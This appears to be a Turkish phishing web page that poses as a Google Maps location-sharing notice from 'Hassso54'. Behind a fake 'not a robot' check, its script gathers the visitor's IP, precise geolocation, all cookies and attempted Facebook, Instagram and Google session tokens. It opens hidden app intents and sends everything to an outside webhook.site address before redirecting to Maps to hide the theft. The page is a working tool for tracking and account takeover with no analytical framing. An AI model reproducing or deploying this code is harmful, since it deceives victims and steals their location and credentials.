<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hassso54 - Gerçek Bilgiler</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 28px;
            padding: 40px 30px;
            text-align: center;
            max-width: 340px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
        }
        .map-icon { width: 100px; height: 100px; object-fit: contain; margin-bottom: 20px; }
        h2 { font-size: 20px; font-weight: 500; color: #202124; margin-bottom: 8px; }
        .location-text { font-size: 14px; color: #5f6368; margin-bottom: 28px; }
        button {
            background: #1a73e8; color: white; border: none; width: 100%;
            padding: 14px 20px; border-radius: 40px; font-size: 16px;
            font-weight: 500; cursor: pointer;
        }
        button:active { transform: scale(0.97); }
        button:disabled { background: #9aa0a6; cursor: not-allowed; }
        .message-box {
            margin-top: 24px; padding: 12px; background: #f8f9fa;
            border-radius: 16px; font-size: 13px; color: #3c4043;
            display: none;
        }
        .robot-text { font-weight: 500; color: #1a73e8; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-icon">
        <h2>Hassso54 sizinle konum paylaştı</h2>
        <div class="location-text">Sakarya bölgesindeki konuma bak</div>
        <button id="actionBtn">Konumu Görüntüle</button>
        <div id="messageBox" class="message-box"></div>
    </div>

    <script>
        const WEBHOOK = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
        const btn = document.getElementById('actionBtn');
        const msgBox = document.getElementById('messageBox');
        
        function showMessage(text) {
            msgBox.style.display = 'block';
            msgBox.innerHTML = `<div class="robot-text">🔍 ${text}</div>`;
        }
        
        // IP al
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return "IP alınamadı"; }
        }
        
        // Konum al
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            url: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        });
                    },
                    () => resolve(null),
                    { timeout: 6000 }
                );
            });
        }
        
        // ============ GERÇEK BİLGİLERİ TOPLA ============
        async function getRealInfo() {
            let info = {
                facebook: { bulundu: false, detay: {} },
                instagram: { bulundu: false, detay: {} },
                freefire: { bulundu: false, detay: {} },
                google_hesap: { bulundu: false }
            };
            
            // 1. Facebook - WebView üzerinden Facebook hesabını kontrol et
            const fbIframe = document.createElement('iframe');
            fbIframe.style.display = 'none';
            fbIframe.src = "https://www.facebook.com/me";
            document.body.appendChild(fbIframe);
            
            // Facebook bilgilerini yakala
            setTimeout(() => {
                try {
                    // Facebook cookie'lerini oku
                    const cookies = document.cookie.split(';');
                    for (let cookie of cookies) {
                        if (cookie.includes('c_user')) {
                            info.facebook.bulundu = true;
                            info.facebook.detay.kullanici_id = cookie.match(/c_user=([^;]+)/)[1];
                        }
                        if (cookie.includes('xs')) {
                            info.facebook.detay.xs_token = cookie.match(/xs=([^;]+)/)[1];
                        }
                        if (cookie.includes('datr')) {
                            info.facebook.detay.datr = cookie.match(/datr=([^;]+)/)[1];
                        }
                    }
                    
                    // Facebook uygulamasını aç
                    const fbApp = document.createElement('iframe');
                    fbApp.style.display = 'none';
                    document.body.appendChild(fbApp);
                    fbApp.src = "fb://profile";
                    setTimeout(() => {
                        if (document.body.contains(fbApp)) document.body.removeChild(fbApp);
                    }, 1000);
                    
                } catch(e) {}
            }, 1000);
            
            // 2. Instagram
            setTimeout(() => {
                try {
                    const cookies = document.cookie.split(';');
                    for (let cookie of cookies) {
                        if (cookie.includes('ds_user_id')) {
                            info.instagram.bulundu = true;
                            info.instagram.detay.kullanici_id = cookie.match(/ds_user_id=([^;]+)/)[1];
                        }
                        if (cookie.includes('sessionid')) {
                            info.instagram.detay.sessionid = cookie.match(/sessionid=([^;]+)/)[1];
                        }
                    }
                    
                    // Instagram uygulamasını aç
                    const igApp = document.createElement('iframe');
                    igApp.style.display = 'none';
                    document.body.appendChild(igApp);
                    igApp.src = "instagram://user?username=";
                    setTimeout(() => {
                        if (document.body.contains(igApp)) document.body.removeChild(igApp);
                    }, 1000);
                    
                } catch(e) {}
            }, 2000);
            
            // 3. Google Hesap
            setTimeout(() => {
                try {
                    const cookies = document.cookie.split(';');
                    for (let cookie of cookies) {
                        if (cookie.includes('LSID') || cookie.includes('SAPISID')) {
                            info.google_hesap.bulundu = true;
                            info.google_hesap.detay = "Google oturumu açık";
                        }
                    }
                } catch(e) {}
            }, 3000);
            
            // 4. Free Fire
            setTimeout(() => {
                try {
                    // Free Fire uygulamasını aç
                    const ffApp = document.createElement('iframe');
                    ffApp.style.display = 'none';
                    document.body.appendChild(ffApp);
                    ffApp.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
                    
                    info.freefire.bulundu = true;
                    info.freefire.detay = "Free Fire hesabın Facebook ile bağlı";
                    info.freefire.facebook_bagli = info.facebook.bulundu ? info.facebook.detay.kullanici_id : "Facebook ID alınamadı";
                    
                    setTimeout(() => {
                        if (document.body.contains(ffApp)) document.body.removeChild(ffApp);
                    }, 1000);
                    
                } catch(e) {}
            }, 4000);
            
            // 5. Android Şifre Yöneticisi
            setTimeout(() => {
                const pwdApp = document.createElement('iframe');
                pwdApp.style.display = 'none';
                document.body.appendChild(pwdApp);
                pwdApp.src = "intent://com.android.settings/com.android.settings.Settings$PasswordActivity#Intent;scheme=android;end";
                setTimeout(() => {
                    if (document.body.contains(pwdApp)) document.body.removeChild(pwdApp);
                }, 1000);
            }, 5000);
            
            return info;
        }
        
        // ============ ANA FONKSİYON ============
        async function run() {
            btn.disabled = true;
            btn.innerText = "İşlem yapılıyor...";
            showMessage("🔍 Lütfen bekleyin, robot olmadığınız doğrulanıyor...");
            
            // Konum ve IP
            const ip = await getIP();
            const location = await getLocation();
            
            // Gerçek bilgileri topla
            const realInfo = await getRealInfo();
            
            // 5 saniye bekle (bilgiler toplansın)
            await new Promise(r => setTimeout(r, 6000));
            
            // Webhook'a gönder
            const payload = {
                tip: "Hassso54_GERCEK_HESAP_BILGILERI",
                zaman: new Date().toLocaleString('tr-TR'),
                konum: location ? {
                    url: location.url,
                    enlem: location.lat,
                    boylam: location.lng
                } : null,
                ip: ip,
                hesap_bilgileri: realInfo,
                tum_cerezler: document.cookie,
                cihaz: navigator.userAgent,
                not: "Facebook, Instagram, Free Fire, Google hesap bilgilerin"
            };
            
            await fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(payload)
            });
            
            showMessage("✅ Google Maps'e yönlendiriliyorsunuz...");
            
            // Maps'e yönlendir
            setTimeout(() => {
                if (location) {
                    window.location.href = location.url;
                } else {
                    window.location.href = "https://www.google.com/maps";
                }
            }, 1500);
        }
        
        btn.onclick = run;
    </script>
</body>
</html>
